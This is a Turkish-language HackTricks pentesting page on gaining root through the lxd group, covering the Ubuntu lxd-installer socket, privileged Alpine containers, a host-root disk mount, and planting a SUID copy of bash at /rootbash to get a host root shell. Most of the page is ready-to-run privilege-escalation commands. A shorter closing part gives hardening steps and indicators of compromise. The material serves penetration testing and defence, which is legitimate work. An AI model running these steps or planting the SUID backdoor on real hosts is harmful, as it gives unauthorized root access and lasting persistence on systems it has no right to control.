# lxd/lxc Group - Yetki yükseltme

{{#include ../../../banners/hacktricks-training.md}}

Host'un LXD yönetim grubuna (genellikle _**lxd**_) üye olmak, daemon üzerinde tam denetim sağlayarak root erişimine giden bir yol sunabilir.<sup>[[1]](#references)</sup> Bu, [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) ve [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md) için açıklanan aynı güven sınırı problemidir: Mevcut süreç zaten bir container içinde olmasa bile yönetim API'sine erişim yeterli olabilir.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` socket aktivasyonu

LXD snap'i kurulu değil diye `lxd` üyeliğinin zararsız olduğunu varsaymayın. Ubuntu Server 24.04 ve sonraki sürümlerde, önceden yüklenen `lxd-installer` paketi `/run/lxd-installer.socket` dosyasını `root:lxd` sahibi ve `0660` moduyla sunar. Bir bağlantı, root olarak `lxd-installer@.service` servisini etkinleştirir; bu servis, sudo parolası veya polkit yetkilendirmesi olmadan LXD snap'ini kurar. Bazı wrapper sürümleri, standart girdi bir TTY olmadığında onay istemini de atlar.<sup>[[10]](#references)[[11]](#references)</sup>

Hesap üyeliğini ve socket ile etkinleştirilen servisi inceleyin:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Yetkili bir `lxd` grubu testi, yükleyiciyi normal `lxc` sarmalayıcısı üzerinden etkinleştirebilir veya doğrudan sokete bağlanabilir. İkinci yöntem, gerçek yetkilendirme sınırının sarmalayıcı istemi değil, Unix soketi ACL'si olduğunu gösterir:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Daemon kullanılabilir olduğunda, aşağıdaki ayrıcalıklı container teknikleriyle devam edin.<sup>[[10]](#references)[[11]](#references)</sup>

## İnternet olmadan exploit etme

### Yöntem 1

LXD ile kullanmak üzere güvenilir bir depodan Alpine image indirebilirsiniz.
Canonical'ın LXD image sunucusu günlük derlemeler yayımlar: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
En yeni derlemeden (dizin adı tarihtir) hem **lxd.tar.xz** hem de **rootfs.squashfs** dosyalarını indirmeniz yeterlidir.<sup>[[8]](#references)</sup>

Alternatif olarak, [proje talimatlarını](https://github.com/lxc/distrobuilder) izleyerek makinenize distrobuilder yükleyebilirsiniz.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

**incus.tar.xz** (**lxd.tar.xz** if you downloaded from the Canonical image server) ve **rootfs.squashfs** dosyalarını yükleyin, ardından imajı içe aktarın ve bir container oluşturun.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Bu hatayı bulursanız _**Error: No storage pool found. Please create a new storage pool**_\
> **`lxd init`** komutunu çalıştırın, varsayılan bir storage pool ayarlayın ve önceki komutları **tekrarlayın**.<sup>[[2]](#references)</sup>

Son olarak container'ı başlatın ve host dosya sisteminde root shell açın:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Bu ayrıcalıklı instance içindeki UID 0 yeniden eşlenmediği için, mount edilmiş host root üzerinden host'a ait bir SUID payload oluşturabilir. Böylece operatörü container shell'inde bırakmak yerine container'dan host'a geçiş tamamlanır:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Payload’ı SUID’i destekleyen bir dosya sistemine yerleştirin. Ayrı bir `/tmp` genellikle `nosuid` olarak mount edilir ve host `/` dizininin recursive olmayan bir bind mount’u altında görünmeyebilir. Bu nedenle host root dosya sistemindeki `/rootbash` gibi bir yol, bu kanıt için daha güvenilirdir.<sup>[[10]](#references)[[11]](#references)</sup>

### Yöntem 2

Bir Alpine imajı oluşturun ve `security.privileged=true` flag’iyle başlatın. Bu, container root’unu host root’a eşler; ardından `/` dizinini mount etmek host dosya sistemini container içinde görünür hâle getirir.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Ana Bilgisayar Genelinde AppArmor Yan Etkisi

LXD snap'ini başlatmak `/run/sysctl.d/zz-lxd.conf` dosyasını da yazabilir ve hem `kernel.apparmor_restrict_unprivileged_userns` hem de `kernel.apparmor_restrict_unprivileged_unconfined` değerlerini `0` olarak ayarlayabilir. Bu, Ubuntu'nun ayrıcalıksız kullanıcı ad alanlarına yönelik kısıtlamalarını tüm yerel kullanıcılar için zayıflatır. Bu nedenle ana bilgisayarı değerlendirirken LXD'yi etkinleştirmeden önceki ve sonraki değerleri kaydedin.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Denetim ve sıkılaştırma

`lxd` üyeliğini root yetkisi verilmesi olarak değerlendirin. Gereksiz bir üyeyi kaldırmak, yalnızca yeni giriş oturumlarında etkili olur; `lxd-installer` paketini kaldırmak veya soketini maskeylemek yalnızca isteğe bağlı kurulum yolunu ortadan kaldırır ve kurulu bir LXD daemon'una zaten erişebilen bir kullanıcının yetkilerini **kısıtlamaz**.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Yararlı ihlal göstergeleri arasında `security.privileged=true` olan LXD örnekleri, `source` değeri `/` olan disk aygıtları, `/run/lxd-installer.socket` dosyasına beklenmeyen bağlantılar, yeni SUID dosyaları ve yukarıdaki AppArmor sysctl değerlerinin `1`'den `0`'a geçişi bulunur.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [LXD için güvenlik nasıl güçlendirilir](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD container'ları ve sanal makineler](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Image'lar nasıl kopyalanır ve içe aktarılır](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilder ile image'lar nasıl derlenir](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image tanımı](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder derleme betiği](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image sunucusu](https://images.lxd.canonical.com/)
- [9] [Tür: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs LXD group ayrıcalık yükseltme raporu ve PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Eski şarap yeni şişede: On yıllık LXD group root erişimi yeniden silahlandırıldı](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
